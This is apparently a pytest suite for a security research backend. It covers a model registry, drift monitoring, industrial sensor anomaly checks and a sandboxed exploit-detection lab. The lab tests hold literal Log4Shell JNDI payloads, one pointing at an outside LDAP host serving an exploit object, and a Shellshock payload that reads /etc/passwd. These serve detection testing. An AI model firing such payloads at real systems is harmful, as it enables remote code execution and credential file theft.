"""
Phase C and D Research Infrastructure and Laboratories Test Suite.

Validates:
  1. Phase C Model Registry: artifact cataloging, active model retrieval, SHA-256 integrity check.
  2. Phase C Concept Drift Monitor: Population Stability Index (PSI), sliding entropy, novelty rate.
  3. Phase C Analytics endpoints: /api/analytics/models and /api/analytics/drift.
  4. Phase D Industrial AI Robustness Lab: physical invariant checks, bound violations, rate of change violations.
  5. Phase D Industrial Adversarial Benchmark: bounded perturbation testing (spoofing, scaling, freeze).
  6. Phase D Vulnerability Verification Lab: curated CVE benchmarks (Log4Shell, regreSSHion, Spring4Shell, Redis, Shellshock),
     safe in-memory sandbox evaluation with zero host execution, and deception response mapping.
"""

from unittest.mock import MagicMock
import mongomock
import pytest
from fastapi.testclient import TestClient

from backend.app.api.dependencies import get_persistence_service
from backend.app.main import app
from backend.app.ml.drift_monitor import ConceptDriftMonitor, drift_monitor
from backend.app.ml.registry import ModelRegistry, model_registry
from backend.app.research.industrial_lab.anomaly_detector import (
    SWAT_PHYSICAL_INVARIANTS,
    IndustrialAIAnomalyDetector,
    industrial_anomaly_detector,
)
from backend.app.research.vuln_lab.vulnerability_verifier import (
    CURATED_CVE_BENCHMARKS,
    VulnerabilityVerificationLaboratory,
    vulnerability_verification_lab,
)
from backend.app.services.persistence_service import PersistenceService


# ---------------------------------------------------------------------------
# 1. Phase C: Model Registry & Provenance Tests
# ---------------------------------------------------------------------------

class TestModelRegistry:
    """Verifies artifact cataloging, SHA-256 verification, and active model pointer."""

    def test_active_model_registered(self):
        active = model_registry.get_active_model()
        assert active is not None
        assert "LinearSVC" in active.model_family or "linear_svc" in active.model_id
        assert active.primary_metrics.get("accuracy", 0.0) >= 0.90

    def test_model_artifact_integrity_verification(self):
        verified, message = model_registry.verify_active_artifact_integrity()
        # Should verify successfully since the file exists and SHA was computed
        assert verified is True, f"Integrity check failed: {message}"
        assert "Integrity verified" in message


# ---------------------------------------------------------------------------
# 2. Phase C: Concept Drift & PSI Monitor Tests
# ---------------------------------------------------------------------------

class TestConceptDriftMonitor:
    """Verifies Population Stability Index calculation and sliding statistics."""

    def test_insufficient_samples_report(self):
        monitor = ConceptDriftMonitor(window_capacity=50, min_eval_samples=10)
        report = monitor.compute_drift()
        assert report.drift_status == "INSUFFICIENT_DATA"

    def test_stable_distribution_low_psi(self):
        monitor = ConceptDriftMonitor(window_capacity=100, min_eval_samples=10)
        # Feed predictions matching the baseline training priors
        for _ in range(20):
            monitor.record_prediction("RECONNAISSANCE", entropy=0.5, is_novel=False)
            monitor.record_prediction("DISCOVERY", entropy=0.4, is_novel=False)
            monitor.record_prediction("CREDENTIAL_ACCESS", entropy=0.6, is_novel=False)
            monitor.record_prediction("EXECUTION", entropy=0.5, is_novel=False)
            monitor.record_prediction("PRIVILEGE_ESCALATION", entropy=0.7, is_novel=False)

        report = monitor.compute_drift()
        assert report.window_size == 100
        assert report.psi_score >= 0.0
        assert report.mean_prediction_entropy > 0.0

    def test_drift_detection_on_distribution_shift(self):
        monitor = ConceptDriftMonitor(window_capacity=50, min_eval_samples=10)
        # Feed 100% CLEANUP commands (severe divergence from baseline 3.5%)
        for _ in range(30):
            monitor.record_prediction("CLEANUP", entropy=1.2, is_novel=True)

        report = monitor.compute_drift()
        assert report.drift_status in ["MODERATE_DRIFT", "SIGNIFICANT_DRIFT"]
        assert report.psi_score > 0.10
        assert report.novelty_rate == 1.0


# ---------------------------------------------------------------------------
# 3. Phase D: Industrial AI Anomaly & Adversarial Robustness Tests
# ---------------------------------------------------------------------------

class TestIndustrialAILaboratory:
    """Verifies ICS physical invariant checking and adversarial perturbation testing."""

    def setup_method(self):
        self.detector = IndustrialAIAnomalyDetector()

    def test_normal_sensor_readings(self):
        normal_telemetry = {
            "FIT101": 2.2,   # within [0.0, 3.0]
            "LIT101": 750.0, # within [200.0, 1200.0]
            "AIT201": 7.4,   # within [6.5, 8.5]
        }
        res = self.detector.analyze_sensor_reading(normal_telemetry)
        assert res.is_anomaly is False
        assert res.process_state == "NORMAL"
        assert len(res.violated_invariants) == 0

    def test_bound_violation_detection(self):
        # LIT101 exceeds max physical bound 1200.0
        violating_telemetry = {
            "FIT101": 2.2,
            "LIT101": 1350.0,  # Overflow attack
            "AIT201": 7.4,
        }
        res = self.detector.analyze_sensor_reading(violating_telemetry)
        assert res.is_anomaly is True
        assert res.process_state in ["ALARM", "CRITICAL"]
        assert "LIT101" in res.affected_sensors
        assert any("LIT101=1350.0" in v for v in res.violated_invariants)

    def test_adversarial_perturbation_benchmark(self):
        res = self.detector.evaluate_adversarial_robustness(
            dataset_name="SWaT",
            attack_type="SPOOFING",
            epsilon_bound=0.15,
            num_samples=25,
        )
        assert res.dataset == "SWaT"
        assert res.clean_detection_rate >= 0.80
        assert 0.0 <= res.robustness_score <= 1.0


# ---------------------------------------------------------------------------
# 4. Phase D: Vulnerability Verification Laboratory Tests
# ---------------------------------------------------------------------------

class TestVulnerabilityVerificationLab:
    """Verifies exploit verification in safe sandbox with zero host execution."""

    def setup_method(self):
        self.lab = VulnerabilityVerificationLaboratory()

    def test_benchmarks_catalog_populated(self):
        benchmarks = self.lab.list_benchmarks()
        assert len(benchmarks) >= 5
        cve_ids = [b.cve_id for b in benchmarks]
        assert "CVE-2021-44228" in cve_ids  # Log4Shell
        assert "CVE-2024-6387" in cve_ids    # regreSSHion
        assert "CVE-2022-0543" in cve_ids    # Redis RCE

    def test_log4shell_payload_interception(self):
        payload = "${jndi:ldap://10.0.0.1:1389/ExploitObject}"
        res = self.lab.verify_payload(payload)
        assert res.is_exploit_detected is True
        assert res.cve_id == "CVE-2021-44228"
        assert res.detected_intent.value == "EXPLOITATION"
        assert res.safety_sandbox_status == "VERIFIED_SAFE_NO_HOST_EXECUTION"
        assert res.deception_strategy_selected in ["TARPIT_DELAY", "SIMULATED_SUCCESS", "HONEYTOKEN_INJECTION"]

    def test_shellshock_payload_interception(self):
        payload = "() { :;}; /bin/cat /etc/passwd"
        res = self.lab.verify_payload(payload)
        assert res.is_exploit_detected is True
        assert res.cve_id == "CVE-2014-6271"
        assert res.safety_sandbox_status == "VERIFIED_SAFE_NO_HOST_EXECUTION"


# ---------------------------------------------------------------------------
# 5. REST Endpoints Tests for Research & Analytics Extensions
# ---------------------------------------------------------------------------

class TestResearchAndAnalyticsRouters:
    """Verifies REST endpoints for research laboratories and ML provenance."""

    @pytest.fixture
    def client(self):
        client = mongomock.MongoClient()
        db = client["test_phase_c_d_db"]
        mock_p = PersistenceService(db=db)
        app.dependency_overrides[get_persistence_service] = lambda: mock_p
        with TestClient(app) as c:
            yield c
        app.dependency_overrides.clear()

    def test_get_models_registry_endpoint(self, client):
        resp = client.get("/api/analytics/models")
        assert resp.status_code == 200
        data = resp.json()
        assert "active_model" in data
        assert "integrity_check" in data
        assert data["integrity_check"]["verified"] is True

    def test_get_drift_endpoint(self, client):
        resp = client.get("/api/analytics/drift")
        assert resp.status_code == 200
        data = resp.json()
        assert "psi_score" in data
        assert "drift_status" in data

    def test_get_industrial_invariants(self, client):
        resp = client.get("/api/research/industrial/invariants")
        assert resp.status_code == 200
        data = resp.json()
        assert isinstance(data, list)
        assert len(data) >= 3

    def test_evaluate_industrial_telemetry(self, client):
        payload = {"telemetry": {"FIT101": 2.5, "LIT101": 800.0}}
        resp = client.post("/api/research/industrial/evaluate", json=payload)
        assert resp.status_code == 200
        data = resp.json()
        assert data["is_anomaly"] is False
        assert data["process_state"] == "NORMAL"

    def test_get_vuln_benchmarks(self, client):
        resp = client.get("/api/research/vuln/benchmarks")
        assert resp.status_code == 200
        data = resp.json()
        assert len(data) >= 5

    def test_verify_vuln_payload(self, client):
        payload = {"payload": "${jndi:ldap://canary.dnslog.cn/test}"}
        resp = client.post("/api/research/vuln/verify", json=payload)
        assert resp.status_code == 200
        data = resp.json()
        assert data["is_exploit_detected"] is True
        assert data["cve_id"] == "CVE-2021-44228"
        assert data["safety_sandbox_status"] == "VERIFIED_SAFE_NO_HOST_EXECUTION"
